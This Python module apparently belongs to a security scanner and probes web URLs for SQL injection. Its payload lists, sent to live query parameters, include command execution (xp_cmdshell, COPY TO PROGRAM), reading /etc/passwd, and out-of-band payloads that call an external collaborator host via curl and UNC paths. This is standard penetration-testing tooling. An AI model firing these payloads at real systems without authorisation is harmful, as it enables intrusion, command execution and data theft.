"""Advanced SQL injection probes with database-specific and timing support."""

from __future__ import annotations

import time
from dataclasses import dataclass
from typing import Any

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.sqli_signals import SQL_ERROR_RE, SQL_PARAM_NAMES

from ._confidence import probe_confidence, probe_severity

DATABASE_SPECIFIC_PAYLOADS: dict[str, list[tuple[str, str]]] = {
    "mysql": [
        ("SLEEP(5)", "mysql_sleep"),
        ("BENCHMARK(1000000,MD5('a'))", "mysql_benchmark"),
        ("UPDATEXML(1,CONCAT(0x3a,VERSION()),1)", "mysql_updatesxml"),
        ("GROUP_CONCAT(table_name)", "mysql_group_concat"),
        ("EXTRACTVALUE(1,CONCAT(0x3a,VERSION()))", "mysql_extractvalue"),
        ("SELECT SLEEP(5)--", "mysql_select_sleep"),
        ("AND SLEEP(5)--", "mysql_and_sleep"),
        ("OR SLEEP(5)--", "mysql_or_sleep"),
        ("BENCHMARK(5000000,MD5('test'))", "mysql_benchmark_heavy"),
        ("UNION SELECT VERSION(),USER(),DATABASE()--", "mysql_union_version"),
    ],
    "postgresql": [
        ("pg_sleep(5)", "postgresql_pg_sleep"),
        ("SELECT pg_sleep(5)", "postgresql_select_sleep"),
        ("AND pg_sleep(5) IS NULL", "postgresql_and_sleep"),
        ("OR pg_sleep(5) IS NULL", "postgresql_or_sleep"),
        ("SELECT pg_read_file('etc/passwd')", "postgresql_read_file"),
        ("COPY (SELECT 1) TO PROGRAM 'id'", "postgresql_copy_program"),
        ("SELECT * FROM pg_locks", "postgresql_pg_locks"),
        ("SELECT version()", "postgresql_version"),
        ("UNION SELECT version(),current_user--", "postgresql_union_version"),
        ("SELECT CAST('a' AS INT)", "postgresql_cast_error"),
    ],
    "mssql": [
        ("WAITFOR DELAY '0:0:5'", "mssql_waitfor"),
        ("WAITFOR DELAY '0:0:10'", "mssql_waitfor_long"),
        ("EXEC xp_cmdshell('id')", "mssql_xp_cmdshell"),
        ("EXEC master..xp_cmdshell 'whoami'", "mssql_xp_cmdshell_whoami"),
        ("SELECT OPENROWSET('SQLOLEDB','';'sa';'pwd','SELECT 1')", "mssql_openrowset"),
        ("AND 1=1; WAITFOR DELAY '0:0:5'--", "mssql_and_waitfor"),
        ("OR 1=1; WAITFOR DELAY '0:0:5'--", "mssql_or_waitfor"),
        ("SELECT @@version", "mssql_version"),
        ("UNION SELECT @@version,DB_NAME(),USER_NAME()--", "mssql_union_version"),
        ("EXEC sp_configure 'show advanced options',1", "mssql_sp_configure"),
    ],
    "generic": [
        ("SLEEP(5)", "generic_sleep"),
        ("AND SLEEP(5)--", "generic_and_sleep"),
        ("OR SLEEP(5)--", "generic_or_sleep"),
        ("UNION SELECT NULL--", "generic_union_null"),
        ("UNION SELECT NULL,NULL--", "generic_union_2col"),
        ("UNION SELECT NULL,NULL,NULL--", "generic_union_3col"),
        ("AND 1=1--", "generic_and_true"),
        ("AND 1=2--", "generic_and_false"),
        ("OR 1=1--", "generic_or_true"),
        ("OR 1=2--", "generic_or_false"),
    ],
}


UNION_PAYLOADS: list[tuple[str, str]] = [
    (f"UNION SELECT {'NULL,' * i}NULL--", f"union_null_{i + 1}col") for i in range(20)
]


BOOLEAN_BLIND_PAYLOADS: list[tuple[str, str]] = [
    ("AND 1=1", "boolean_true"),
    ("AND 1=2", "boolean_false"),
    ("AND TRUE", "boolean_true_kw"),
    ("AND FALSE", "boolean_false_kw"),
    ("OR 1=1", "boolean_or_true"),
    ("OR 1=2", "boolean_or_false"),
    ("AND 1=1#", "boolean_true_hash"),
    ("AND 1=2#", "boolean_false_hash"),
    ("AND 1=1--", "boolean_true_dash"),
    ("AND 1=2--", "boolean_false_dash"),
]


OOB_PAYLOADS: list[tuple[str, str]] = [
    (
        "LOAD_FILE('\\\\\\\\collaborator.oastify.com\\\\x')",
        "oob_mysql_load_file",
    ),
    (
        "LOAD_FILE('\\\\\\\\collaborator.oastify.com\\\\test.txt')",
        "oob_mysql_load_file_txt",
    ),
    (
        "SELECT INTO OUTFILE '\\\\\\\\collaborator.oastify.com\\\\out'",
        "oob_mysql_outfile",
    ),
    (
        "COPY (SELECT 1) TO PROGRAM 'curl http://collaborator.oastify.com/x'",
        "oob_postgresql_copy",
    ),
    (
        "SELECT pg_read_file('\\\\\\\\collaborator.oastify.com\\\\x')",
        "oob_postgresql_pg_read",
    ),
    (
        "EXEC master..xp_dirtree '\\\\\\\\collaborator.oastify.com\\\\share'",
        "oob_mssql_xp_dirtree",
    ),
]


@dataclass(slots=True)
class SQLiAdvancedProbe:
    """Container for advanced SQLi probe results."""

    payload: str
    payload_type: str
    database: str
    response_status: int
    response_time_ms: float
    response_length: int
    error_pattern: str | None
    is_error: bool
    is_timing: bool
    is_boolean: bool
    is_oob: bool


def _build_union_payloads() -> list[str]:
    return [payload for payload, _ in UNION_PAYLOADS]


def _build_boolean_payloads() -> list[str]:
    return [payload for payload, _ in BOOLEAN_BLIND_PAYLOADS]


def _build_oob_payloads(collaborator: str) -> list[str]:
    domain = collaborator.replace("http://", "").replace("https://", "").rstrip("/")
    return [payload.replace("collaborator.oastify.com", domain) for payload, _ in OOB_PAYLOADS]


def _detect_database_type(
    url: str,
    body: str,
    headers: dict[str, str],
) -> str:
    db_indicators = {
        "mysql": ["mysql", "mariadb", "mysqli"],
        "postgresql": ["postgresql", "postgres", "pg_"],
        "mssql": ["microsoft sql server", "mssql", "sql server", "asp.net"],
    }
    lowered = f"{url} {body} {' '.join(headers.values())}".lower()
    for db_type, indicators in db_indicators.items():
        if any(indicator in lowered for indicator in indicators):
            return db_type
    return "generic"


def sqli_advanced_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: Any,
    limit: int = 100,
    databases: list[str] | None = None,
    collaborator: str = "collaborator.oastify.com",
) -> list[dict[str, Any]]:
    """Run advanced SQLi probes with database-specific payloads, UNION, boolean, and OOB.

    Args:
        priority_urls: Target URLs.
        response_cache: Cached HTTP response provider.
        limit: Maximum findings to return.
        databases: Database types to test (defaults to all).
        collaborator: OOB collaborator domain.

    Returns:
        List of SQLi finding dicts.
    """
    if response_cache is None:
        return []

    from src.recon.common import normalize_url

    if databases is None:
        databases = ["mysql", "postgresql", "mssql", "generic"]

    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    _build_union_payloads()
    _build_boolean_payloads()
    _build_oob_payloads(collaborator)

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break

        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

        parsed = urlparse(url)
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        if not query_pairs:
            continue

        sql_params = [
            (i, k, v) for i, (k, v) in enumerate(query_pairs) if k.lower() in SQL_PARAM_NAMES
        ]
        if not sql_params:
            continue

        baseline = response_cache.request(url)
        if baseline:
            baseline_status = int(baseline.get("status_code") or 0)
            baseline_len = len(str(baseline.get("body_text") or ""))
            baseline_headers = dict(baseline.get("headers") or {})
        else:
            baseline_status = None
            baseline_len = 0
            baseline_headers = {}
        db_type = _detect_database_type(
            url, str(baseline.get("body_text") or "") if baseline else "", baseline_headers
        )

        url_findings: list[dict[str, Any]] = []
        url_issues: list[str] = []

        for idx, param_name, _param_value in sql_params:
            if len(url_findings) >= 3:
                break

            all_payloads: list[tuple[str, str, str]] = []

            for db in databases:
                for payload, ptype in DATABASE_SPECIFIC_PAYLOADS.get(db, []):
                    all_payloads.append((payload, ptype, db))

            all_payloads.extend((p, ptype, "union") for p, ptype in UNION_PAYLOADS[:10])
            all_payloads.extend((p, ptype, "boolean") for p, ptype in BOOLEAN_BLIND_PAYLOADS)
            all_payloads.extend((p, ptype, "oob") for p, ptype in OOB_PAYLOADS)

            for payload, payload_type, db in all_payloads:
                if len(url_findings) >= 5:
                    break

                updated = list(query_pairs)
                updated[idx] = (param_name, payload)
                test_url = normalize_url(
                    urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))
                )

                start = time.perf_counter()
                response = response_cache.request(
                    test_url,
                    headers={"Cache-Control": "no-cache", "X-SQLi-Advanced-Probe": "1"},
                )
                elapsed_ms = (time.perf_counter() - start) * 1000.0

                if not response:
                    continue

                body = str(response.get("body_text", "") or "")[:8000]
                status = int(response.get("status_code") or 0)
                response_len = len(body)

                error_match = SQL_ERROR_RE.search(body)
                error_pattern = error_match.group(0) if error_match else None

                issues_for_hit: list[str] = []

                is_timing = elapsed_ms > 4000
                is_error = bool(error_match) or (
                    status == 500 and baseline_status is not None and baseline_status < 400
                )
                is_oob = "oob" in payload_type and elapsed_ms > 3000
                is_boolean = "boolean" in payload_type
                is_union = "union" in payload_type

                if is_error:
                    issues_for_hit.append("sqli_error_response")
                if is_timing:
                    issues_for_hit.append("sqli_timing_anomaly")
                if is_oob:
                    issues_for_hit.append("sqli_oob_indicator")
                if is_boolean and status != baseline_status:
                    issues_for_hit.append("sqli_boolean_blind")
                if (
                    is_union
                    and abs(response_len - baseline_len) > baseline_len * 0.3
                    and baseline_len > 0
                ):
                    issues_for_hit.append("sqli_union_response")

                if issues_for_hit:
                    url_issues.extend(issues_for_hit)
                    url_findings.append(
                        {
                            "parameter": param_name,
                            "payload": payload,
                            "payload_type": payload_type,
                            "database": db,
                            "status_code": status,
                            "response_time_ms": round(elapsed_ms, 2),
                            "response_length": response_len,
                            "error_pattern": error_pattern,
                            "is_error": is_error,
                            "is_timing": is_timing,
                            "is_oob": is_oob,
                            "is_boolean": is_boolean,
                            "is_union": is_union,
                            "issues": issues_for_hit,
                        }
                    )

        if url_findings:
            unique_issues = list(dict.fromkeys(url_issues))
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "detected_db": db_type,
                    "issues": unique_issues,
                    "probes": url_findings,
                    "confidence": probe_confidence(unique_issues),
                    "severity": probe_severity(unique_issues),
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
